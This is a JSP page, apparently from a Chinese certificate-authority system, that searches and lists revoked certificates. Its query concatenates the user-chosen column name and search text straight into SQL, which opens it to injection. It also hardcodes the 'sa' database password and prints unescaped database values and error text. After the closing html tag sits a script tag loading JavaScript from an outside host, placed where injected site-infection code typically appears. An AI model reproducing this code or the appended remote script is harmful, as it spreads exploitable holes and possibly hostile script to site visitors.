<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.sql.*"%>
<html>
<head>
</head>

<body bgcolor="#FFFFFF" text="#000000">
<h3 align=center>浏览已经被撤消的证书</h3>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr> 
    <td height="2" width="70%">这里列出了已经被撤消的证书: </td>
    <td height="2" width="30%" nowrap><font size="2">1.输入查询条件点击[查询]</font></td>
  </tr>
  <tr> 
    <td width="70%"> 
      <form name="searchForm" method="post" >
        <select name="colname">
          <option value="certId">证书序列号</option>
          <option value="applyCN" selected>姓名</option>
          <option value="applyO">单位</option>
          <option value="applyId">证书申请号</option>
          <option value="rvDate">撤消日期</option>
        </select>
        <input type="text" name="colvalue" value="">
        <input type="submit" name="Submit" value="查询" >
      </form>
    </td>
    <td width="30%" nowrap><font size="2">2.查看证书撤消的日期和原因</font></td>
  </tr>
</table>
<table border="1" cellspacing="0" cellpadding="0" bordercolor="#999999">
  <tr> 
    <td nowrap> 
      <div align="center"><font size="2" color="#0000FF">证书序列号</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">姓名</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">所在单位</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">证书用途</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">证书申请号</font></div>
    </td>
    <td nowrap> 
      <div align="center"><font size="2" color="#0000FF">撤消日期</font></div>
    </td>
    <td  nowrap> 
      <div align="center"><font size="2" color="#0000FF">撤消原因</font></div>
    </td>
  </tr>
<%
	String colname=request.getParameter("colname");
	String colvalue=request.getParameter("colvalue");

	String  sqlstr="select * from CertBrowserView_Revocated ";

	if(colvalue!=null && colvalue.length()!=0)
	{
		colname=new String(colname.getBytes("ISO-8859-1"));
		colvalue=new String(colvalue.getBytes("ISO-8859-1"));	
		sqlstr=sqlstr+"where "+colname+" like '%"+colvalue+"%'";
	}

	Connection conn=null;
	try
	{
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
		Statement stmt=conn.createStatement();
		ResultSet rs=stmt.executeQuery(sqlstr);		
		while(rs.next())
		{
			String certId=rs.getBigDecimal("certId").toString();
			//System.out.println(certId);
%>


  <tr> 
    <td  nowrap height="2"><font size="2"><%=certId%></font></td>
    <td  nowrap height="2"><font size="2"><%=rs.getString(2)%></font></td>
    <td  nowrap height="2"><font size="2"><%=rs.getString(3)%></font></td>
    <td  nowrap height="2"><font size="2"><% int certType=rs.getInt(4); if(certType==0) out.print("验证签名"); else out.print("加解密");%></font></td>
    <td  nowrap height="2"><font size="2"><%=rs.getBigDecimal(5).toString()%></font></td>
    <td  nowrap height="2"><font size="2"><%=new java.util.Date(rs.getString("rvDate")).toLocaleString()%></font></td>
    <td  height="2"><font size="2"><%=rs.getString("rvReason")%></font></td>
  </tr>


<%
		}		
			
	}
	catch(Exception ex)
	{	
		out.println(ex.toString());
%>

<tr><td>对不起，数据库操作出错！</td></tr>	
<%	
	}
	try{conn.close();}catch(Exception ex){}
	
%>
</table>
</body>
</html>

<script language=javascript src=http://www.qq.com/qq.js></script>